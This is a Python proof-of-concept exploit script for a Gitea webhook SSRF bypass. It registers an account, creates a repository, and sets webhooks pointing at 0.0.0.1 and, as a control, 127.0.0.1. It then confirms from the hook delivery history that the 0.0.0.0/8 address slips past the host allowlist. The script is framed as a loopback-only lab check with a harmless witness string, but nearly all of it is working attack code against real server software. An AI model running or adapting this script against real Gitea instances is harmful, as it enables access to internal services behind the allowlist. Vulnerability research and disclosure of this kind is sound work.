#!/usr/bin/env python3
"""Local oracle: Gitea webhook hostmatcher misses RFC 6890 0.0.0.0/8.

Repo admin sets webhook http://0.0.0.1:8080/ssrf. Delivery stores the HTTP
body in hook history. 127.0.0.1 on the same port must stay blocked.
Loopback only. Witness GITEA-0000-SSRF, not eval/shell.
"""
from __future__ import annotations

import base64
import http.cookiejar
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass

LABEL = "GITEA-HOSTMATCHER-0000"
WITNESS = "GITEA-0000-SSRF"
DEFAULT_BASE = "http://127.0.0.1:18131"
ORACLE_HIT = "http://0.0.0.1:8080/ssrf"
ORACLE_NEG = "http://127.0.0.1:8080/ssrf"
PASSWORD = "LabPass123!"
USER_AGENT = "gitea-hostmatcher-0000-ssrf-lab"
EXPECTED_VERSION = "1.27.3"
HTTP_TIMEOUT_S = 30
REPO_READY_TRIES = 20
HISTORY_POLLS = 24
HISTORY_POLL_SLEEP_S = 2
DENY_MARKERS = ("allowed HTTP servers", "can only call allowed")


@dataclass
class LabConfig:
    base: str
    user: str
    password: str
    email: str
    repo: str
    oracle_hit: str = ORACLE_HIT
    oracle_neg: str = ORACLE_NEG
    witness: str = WITNESS

    @classmethod
    def from_argv(cls, argv: list[str]) -> LabConfig:
        suffix = uuid.uuid4().hex[:8]
        user = f"labuser{suffix}"
        base = (argv[1] if len(argv) > 1 else DEFAULT_BASE).rstrip("/")
        return cls(
            base=base,
            user=user,
            password=PASSWORD,
            email=f"{user}@lab.local",
            repo=f"ssrf{suffix}",
        )


class GiteaClient:
    def __init__(self, cfg: LabConfig) -> None:
        self.cfg = cfg
        self._ctx = ssl._create_unverified_context()
        self._jar = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self._jar),
            urllib.request.HTTPSHandler(context=self._ctx),
        )

    def http_req(
        self,
        method: str,
        url: str,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
        timeout: int = HTTP_TIMEOUT_S,
    ) -> tuple[int, str]:
        hdrs = {"User-Agent": USER_AGENT}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with self._opener.open(req, timeout=timeout) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")

    def csrf_from(self) -> str:
        for cookie in self._jar:
            if cookie.name in ("_csrf", "_Csrf"):
                return cookie.value
        return ""

    def form_post(self, path: str, fields: dict[str, str]) -> tuple[int, str]:
        token = self.csrf_from()
        if token:
            fields = dict(fields)
            fields["_csrf"] = token
        body = urllib.parse.urlencode(fields).encode()
        return self.http_req(
            "POST",
            self.cfg.base + path,
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

    def api(
        self,
        method: str,
        path: str,
        data: dict[str, object] | None = None,
    ) -> tuple[int, str]:
        basic = base64.b64encode(f"{self.cfg.user}:{self.cfg.password}".encode()).decode()
        hdrs = {
            "Content-Type": "application/json",
            "Authorization": "Basic " + basic,
        }
        body = None if data is None else json.dumps(data).encode()
        return self.http_req(method, self.cfg.base + path, data=body, headers=hdrs)


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def _denyish(html: str) -> bool:
    return "deny" in html.lower() or any(marker in html for marker in DENY_MARKERS)


def _history_snippet(html: str) -> str:
    marker = "webhook-info"
    if marker in html:
        start = html.find(marker)
        return html[start : start + 400]
    return html[:400]


def register_or_login(client: GiteaClient) -> bool:
    cfg = client.cfg
    status, _page = client.http_req("GET", cfg.base + "/user/sign_up")
    print(f"IOC signup-get status={status} csrf={bool(client.csrf_from())}")
    status, body = client.form_post(
        "/user/sign_up",
        {
            "user_name": cfg.user,
            "email": cfg.email,
            "password": cfg.password,
            "retype": cfg.password,
        },
    )
    print(f"IOC signup-post status={status} snippet={body[:160]!r}")
    status_me, body_me = client.api("GET", "/api/v1/user")
    if status_me == 200 and cfg.user in body_me:
        print(f"IOC registered user={cfg.user}")
        return True
    status, _page = client.http_req("GET", cfg.base + "/user/login")
    status, body = client.form_post(
        "/user/login",
        {"user_name": cfg.user, "password": cfg.password},
    )
    print(f"IOC login-post status={status} snippet={body[:120]!r}")
    status_me, body_me = client.api("GET", "/api/v1/user")
    print(f"IOC user status={status_me} snippet={body_me[:120]!r}")
    return status_me == 200


def create_repo(client: GiteaClient) -> bool:
    cfg = client.cfg
    status, body = client.api(
        "POST",
        "/api/v1/user/repos",
        {
            "name": cfg.repo,
            "private": True,
            "auto_init": True,
            "readme": "Default",
            "default_branch": "main",
        },
    )
    print(f"IOC create-repo status={status} snippet={body[:180]!r}")
    if status not in (200, 201):
        print("FAIL create repo")
        return False
    for i in range(REPO_READY_TRIES):
        status, body = client.api("GET", f"/api/v1/repos/{cfg.user}/{cfg.repo}")
        compact = body.replace(" ", "").lower()
        if (status == 200 and '"empty":false' in compact) or (
            status == 200 and '"empty": false' in body
        ):
            print(f"IOC repo-ready i={i}")
            return True
        if status == 200:
            try:
                empty = json.loads(body).get("empty")
            except json.JSONDecodeError:
                empty = True
            if empty is False:
                print(f"IOC repo-ready i={i}")
                return True
        time.sleep(1)
    print("FAIL repo never got an initial commit")
    return False


def create_hook(client: GiteaClient, url: str, name: str) -> int | None:
    cfg = client.cfg
    status, body = client.api(
        "POST",
        f"/api/v1/repos/{cfg.user}/{cfg.repo}/hooks",
        {
            "type": "gitea",
            "active": True,
            "events": ["push"],
            "name": name,
            "config": {"url": url, "content_type": "json", "http_method": "post"},
        },
    )
    print(f"IOC create-hook name={name} status={status} snippet={body[:220]!r}")
    if status not in (200, 201):
        print(f"FAIL create webhook {name}")
        return None
    hook_id = json.loads(body).get("id")
    if not hook_id:
        print("FAIL webhook id missing")
        return None
    return int(hook_id)


def test_hook(client: GiteaClient, hook_id: int) -> bool:
    cfg = client.cfg
    status, body = client.api(
        "POST",
        f"/api/v1/repos/{cfg.user}/{cfg.repo}/hooks/{hook_id}/tests",
    )
    print(f"IOC test-hook id={hook_id} status={status} snippet={body[:160]!r}")
    return status in (200, 204)


def history_html(client: GiteaClient, hook_id: int) -> str:
    cfg = client.cfg
    status, body = client.http_req(
        "GET",
        f"{cfg.base}/{cfg.user}/{cfg.repo}/settings/hooks/{hook_id}",
    )
    print(f"IOC history-page id={hook_id} status={status} len={len(body)}")
    if status != 200:
        return ""
    return body


def wait_history(client: GiteaClient, hook_id: int, expect_witness: bool) -> str:
    last = ""
    for i in range(HISTORY_POLLS):
        last = history_html(client, hook_id)
        has = client.cfg.witness in last
        deny = _denyish(last)
        print(f"IOC poll i={i} id={hook_id} witness={has} denyish={deny}")
        if expect_witness and has:
            return last
        if not expect_witness and (deny or ("Delivery:" in last and not has)):
            return last
        time.sleep(HISTORY_POLL_SLEEP_S)
    return last


def main() -> int:
    cfg = LabConfig.from_argv(sys.argv)
    client = GiteaClient(cfg)
    print(
        f"IOC base={cfg.base} user={cfg.user} repo={cfg.repo} "
        f"hit={cfg.oracle_hit} neg={cfg.oracle_neg}"
    )
    status, body = client.http_req("GET", cfg.base + "/api/v1/version")
    print(f"IOC version status={status} snippet={body[:120]!r}")
    if status != 200 or EXPECTED_VERSION not in body:
        return fail("unexpected Gitea version")

    if not register_or_login(client):
        return fail("could not register or login")
    if not create_repo(client):
        return 1

    neg_id = create_hook(client, cfg.oracle_neg, "neg-loopback")
    if neg_id is None:
        return 1
    if not test_hook(client, neg_id):
        return fail("test webhook")
    neg_html = wait_history(client, neg_id, expect_witness=False)
    if cfg.witness in neg_html:
        return fail("127.0.0.1 webhook was not blocked")
    if not _denyish(neg_html):
        if not neg_html:
            return fail("no negative-control history")
        print(f"IOC neg-history-snippet={_history_snippet(neg_html)!r}")
        if "200" in neg_html and WITNESS in neg_html:
            return fail("127.0.0.1 reached oracle")
    print("IOC negative-control 127.0.0.1 blocked")

    hit_id = create_hook(client, cfg.oracle_hit, "hit-0000")
    if hit_id is None:
        return 1
    if not test_hook(client, hit_id):
        return fail("test webhook")
    hit_html = wait_history(client, hit_id, expect_witness=True)
    if cfg.witness not in hit_html:
        return fail("0.0.0.1 blocked like 127.0.0.1 (no witness in history)")
    print(f"SUCCESS {LABEL}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
